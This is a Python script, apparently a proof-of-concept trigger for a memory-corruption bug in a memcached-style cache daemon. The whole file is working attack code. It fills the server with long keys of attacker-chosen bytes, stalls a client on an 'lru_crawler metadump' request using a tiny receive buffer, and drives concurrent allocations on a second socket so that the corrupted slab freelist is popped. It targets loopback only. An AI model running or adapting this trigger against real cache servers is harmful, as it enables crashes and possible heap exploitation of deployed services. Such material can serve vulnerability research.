#!/usr/bin/env python3
# Loopback-only variant of trigger.py: after stalling the metadump client,
# drive concurrent allocations on a second socket so the corrupted slab
# freelist is actually popped. Same chosen key bytes; no external address.
import socket
import sys
import time

HOST = "127.0.0.1"
PORT = int(sys.argv[1])
N = int(sys.argv[2]) if len(sys.argv) > 2 else 8000
KEYBYTE = bytes([int(sys.argv[3], 0)]) if len(sys.argv) > 3 else b"Z"
HOLD = int(sys.argv[4]) if len(sys.argv) > 4 else 150
KEYLEN = 240


def connect():
    end = time.monotonic() + 60
    while time.monotonic() < end:
        try:
            return socket.create_connection((HOST, PORT), timeout=5)
        except OSError:
            time.sleep(0.1)
    raise SystemExit("daemon never listened on %s:%d" % (HOST, PORT))


def main():
    store = connect()
    fh = store.makefile("rb")
    prefix = KEYBYTE * KEYLEN
    for i in range(N):
        k = prefix + (b"%05d" % i)
        store.sendall(b"set " + k + b" 0 0 1\r\nx\r\n")
        if fh.readline() != b"STORED\r\n":
            raise SystemExit("store failed at %d" % i)
    fh.close()
    store.close()
    print("stored %d keys of byte %r" % (N, KEYBYTE), flush=True)

    stalled = connect()
    stalled.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4096)
    stalled.sendall(b"lru_crawler metadump all\r\n")
    print("metadump issued; stalled client held %ds" % HOLD, flush=True)

    worker = connect()
    wf = worker.makefile("rb")
    start = time.monotonic()
    n = 0
    while time.monotonic() - start < HOLD:
        k = KEYBYTE * KEYLEN + (b"s%06d" % n)
        try:
            worker.sendall(b"set " + k + b" 0 0 1\r\nx\r\n")
            resp = wf.readline()
        except OSError as exc:
            print("allocator-driver socket died at n=%d: %s" % (n, exc),
                  flush=True)
            break
        if resp != b"STORED\r\n":
            print("allocator-driver store failed at n=%d: %r" % (n, resp),
                  flush=True)
            break
        n += 1
        if n % 1000 == 0:
            print("allocator-driver sets=%d t=%.1fs" %
                  (n, time.monotonic() - start), flush=True)
        time.sleep(0.002)
    print("allocator-driver done sets=%d" % n, flush=True)
    stalled.close()
    worker.close()


if __name__ == "__main__":
    main()
